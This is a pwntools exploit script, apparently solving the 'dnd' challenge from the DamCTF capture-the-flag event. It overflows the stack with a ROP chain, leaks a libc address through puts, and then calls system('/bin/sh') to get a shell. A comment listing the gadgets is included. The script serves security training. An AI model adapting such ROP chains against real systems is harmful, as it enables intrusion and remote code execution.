from pwn import *

elf = context.binary = ELF('./dnd')
libc = ELF('libc.so.6', checksec=False)
env = None
context.terminal = ['kitty', '-e']    
gdbscript = '''
b*main
b*0x000000000040201a
b*0x0000000000402640
c
'''

ld_path = './ld-linux-x86-64.so.2'
libc_path = './libc.so.6'
argv = [ld_path, '--library-path', '.', elf.path]

if args.REMOTE:
    p = remote('dnd.chals.damctf.xyz',30813)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript=gdbscript)
else:
    p = process(argv, env=env)

def handle_attack_or_run():
    try:
        while True:
            line = p.recv(1024)  # Adjust size as needed
            log.info(f"Received: {line.strip()}")
            if b'[a]ttack or [r]un' in line:
                p.sendline(b'a')
            elif b'fierce warrior' in line:
                log.success("Reached payload prompt!")
                break
            elif b'You lost!' in line:
                log.warning('Completed all five rounds.')
    except EOFError:
        log.error("EOF received. The process might have crashed.")
        p.close()
        exit()
    except Exception as e:
        log.error(f"Unexpected error: {e}")
        p.close()
        exit()



def send_payload():
    payload = flat (
        cyclic(offset),
        ret,
        rdi_rbp,
        elf.got['puts'],
         0xdeadbeefdeadbeef,
        elf.plt['puts'],
        elf.sym['main']
    )
    p.sendline(payload)


# ======================= Stage 1: Leak =======================
handle_attack_or_run()

ret = 0x000000000040201a 
rdi_rbp = 0x0000000000402640
offset = 104 

send_payload()

p.recvuntil(b'forever,')
leaked_line = p.recvuntil(b'#').strip()
leak = leaked_line[0x27:0x27+6]
libc_leak = u64(leak.ljust(8, b'\x00'))
log.success(f"[*] Leaked libc address: {hex(libc_leak)}")

libc_base = libc_leak - libc.symbols['puts']
log.success(f"[*] base libc address: {hex(libc_base)}")
binsh = next(libc.search(b'/bin/sh')) + libc_base
system =  libc.symbols['system'] + libc_base
log.success(f"[*] binsh libc address: {hex(binsh)}")
log.success(f"[*] system libc address: {hex(system)}")


# ======================= Stage 2: Exploit =======================
handle_attack_or_run()
rdi = 0x000000000010f75b
pop_rdi = libc_base + rdi
payload = flat (
    cyclic(offset),
    ret,
    pop_rdi,
    binsh,
    system
)
p.sendline(payload)

p.interactive()


'''
offset is 104
0x000000000040201a : ret
0x000000000040261d : pop rbp ; ret
0x0000000000404558 : pop rsi ; pop rbp ; ret
0x0000000000402cff : pop rsp ; pop rbp ; ret
0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret

libc gadgets
0x000000000010f75b : pop rdi ; ret

exploit:
rdi - load bin/sh addr
call system

'''